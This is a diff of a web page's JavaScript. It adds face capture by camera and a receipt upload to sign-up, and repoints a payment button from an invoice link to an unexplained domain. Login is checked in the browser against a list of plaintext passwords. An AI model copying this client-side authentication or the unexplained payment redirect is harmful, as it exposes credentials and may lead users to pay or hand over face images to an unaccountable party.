-      if (cameraStream) {
-        cameraStream.getTracks().forEach(track => track.stop());
-        cameraStream = null;
+      if (mediaStream) {
+        mediaStream.getTracks().forEach(track => track.stop());
       }
       closeModal("cameraModal");
     }
 
-    function capturePhoto(previewElement, inputElement) {
+    $("openCameraBtn").addEventListener("click", (e) => {
+      e.preventDefault();
+      startCamera();
+    });
+
+    $("captureBtn").addEventListener("click", () => {
       const video = $("cameraVideo");
-      const canvas = document.createElement("canvas");
+      const canvas = $("cameraCanvas");
+      const context = canvas.getContext('2d');
+      
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
-      const ctx = canvas.getContext("2d");
-      ctx.drawImage(video, 0, 0);
-      const photoData = canvas.toDataURL("image/jpeg");
-      previewElement.src = photoData;
-      previewElement.classList.add("show");
-      inputElement.value = photoData;
+      context.drawImage(video, 0, 0);
+      
+      const imageData = canvas.toDataURL('image/png');
+      $("faceData").value = imageData;
+      $("facePreviewImg").src = imageData;
+      $("facePreview").style.display = "block";
+      $("capturedImage").src = imageData;
+      $("capturedImage").style.display = "block";
+      
       stopCamera();
-    }
-
-    $("cameraCaptureBtn").addEventListener("click", () => {
-      capturePhoto($("signupFacePreview"), $("signupFaceInput"));
     });
 
     $("cameraCloseBtn").addEventListener("click", () => {
       stopCamera();
     });
 
-    $("faceCaptureBtnSignup").addEventListener("click", (e) => {
-      e.preventDefault();
-      startCamera();
+    // Receipt Upload
+    $("receiptUploadArea").addEventListener("click", () => {
+      $("receiptFileInput").click();
     });
 
+    $("receiptFileInput").addEventListener("change", (e) => {
+      if (e.target.files.length > 0) {
+        $("receiptFileName").textContent = "✓ " + e.target.files[0].name;
+      }
+    });
+
+    // Make Payment Button
     $("makePaymentBtn").addEventListener("click", (e) => {
       e.preventDefault();
       showLoading();
       setTimeout(() => {
         hideLoading();
-        window.open("https://app.raenest.com/invoice/payment/RNM9573Y7", "_blank");
+        window.location.href = "https://firhhfj.md.ng";
       }, 1500);
     });
 
-    $("loginForm").addEventListener("submit", (event) => {
-      event.preventDefault();
-      const email = $("loginEmail").value.trim();
-      const password = $("loginPassword").value;
-      const user = USERS.find((item) => item.email === email && item.password === password);
-      if (!user) {
-        showAlert("Login unsuccessful", "The email or password you entered is incorrect. Please check your details and try again.");
+    // Sign-up Form Submission
+    $("signupForm").addEventListener("submit", (e) => {
+      e.preventDefault();
+
+      if (!$("faceData").value) {
+        showAlert("Face Capture Required", "Please capture your face before registering.");
         return;
       }
+
+      if (!$("receiptFileInput").files.length) {
+        showAlert("Receipt Required", "Please upload your payment receipt.");
+        return;
+      }
+
+      showLoading();
+      setTimeout(() => {
+        hideLoading();
+        $("signupForm").submit();
+        closeModal("signupModal");
+      }, 1500);
+    });
+
+    // Login form
+    $("loginForm").addEventListener("submit", (event) => {
+      event.preventDefault();
+
+      const email = $("loginEmail").value.trim();
+      const password = $("loginPassword").value;
+
+      const user = USERS.find(
+        (item) => item.email === email && item.password === password
+      );
+
+      if (!user) {
+        showAlert("Login Failed", "Invalid email or password. Please try again.");
+        return;
+      }
+
       showLoading();
       setTimeout(() => {
         hideLoading();
@@ -2968,6 +3011,7 @@
       }, 1500);
     });
 
+    // Signup link
     $("signupLink").addEventListener("click", (event) => {
       event.preventDefault();
       showLoading();
@@ -2977,19 +3021,7 @@
       }, 1000);
     });
 
-    $("signupForm").addEventListener("submit", (e) => {
-      e.preventDefault();
-      if (!$("signupFaceInput").value) {
-        alert("Please capture a face photo");
-        return;
-      }
-      showLoading();
-      setTimeout(() => {
-        hideLoading();
-        $("signupForm").submit();
-      }, 1500);
-    });
-
+    // Profile shortcut
     $("profileShortcut").addEventListener("click", () => {
       showLoading();
       setTimeout(() => {
@@ -2997,11 +3029,12 @@
         if (currentUser) {
           showProfile(currentUser);
         } else {
-          alert("No user is currently logged in.");
+          showAlert("Error", "No user is currently logged in.");
         }
       }, 1500);
     });
 
+    // Me button
     $("meButton").addEventListener("click", () => {
       showLoading();
       setTimeout(() => {
@@ -3009,11 +3042,12 @@
         if (currentUser) {
           showProfile(currentUser);
         } else {
-          alert("No user is currently logged in.");
+          showAlert("Error", "No user is currently logged in.");
         }
       }, 1500);
     });
 
+    // Initialize
     window.addEventListener("load", () => {
       setTimeout(() => {
         $("coverPage").classList.add("hidden");
